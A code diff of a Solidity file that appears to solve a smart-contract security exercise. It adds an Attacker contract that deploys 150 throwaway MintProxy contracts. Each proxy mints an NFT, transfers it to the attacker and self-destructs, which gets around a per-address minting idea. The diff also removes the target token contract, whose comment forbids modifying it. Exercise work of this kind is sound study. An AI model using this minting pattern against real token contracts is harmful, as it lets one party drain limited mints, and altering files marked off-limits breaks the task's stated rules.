@@ -1,23 +1,23 @@
-//SPDX-License-Identifier: GPL-3.0
+// SPDX-License-Identifier: GPL-3.0
 pragma solidity 0.8.15;
 
-import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
+interface INotRareToken {
+    function mint() external;
+    function transferFrom(address from, address to, uint256 tokenId) external;
+}
 
-// You may not modify this contract or the openzeppelin contracts
-contract NotRareToken is ERC721 {
-    mapping(address => bool) private alreadyMinted;
-
-    uint256 private totalSupply;
-
-    constructor() ERC721("NotRareToken", "NRT") {}
-
-    function mint() external {
-        totalSupply++;
-        _safeMint(msg.sender, totalSupply);
-        alreadyMinted[msg.sender] = true;
+contract MintProxy {
+    constructor(address notRareToken, address recipient, uint256 tokenId) {
+        INotRareToken(notRareToken).mint();
+        INotRareToken(notRareToken).transferFrom(address(this), recipient, tokenId);
+        selfdestruct(payable(recipient));
     }
 }
 
 contract Attacker {
-    constructor(address victim) {}
+    constructor(address victim) {
+        for (uint256 i = 0; i < 150; i++) {
+            new MintProxy(victim, msg.sender, i + 1);
+        }
+    }
 }
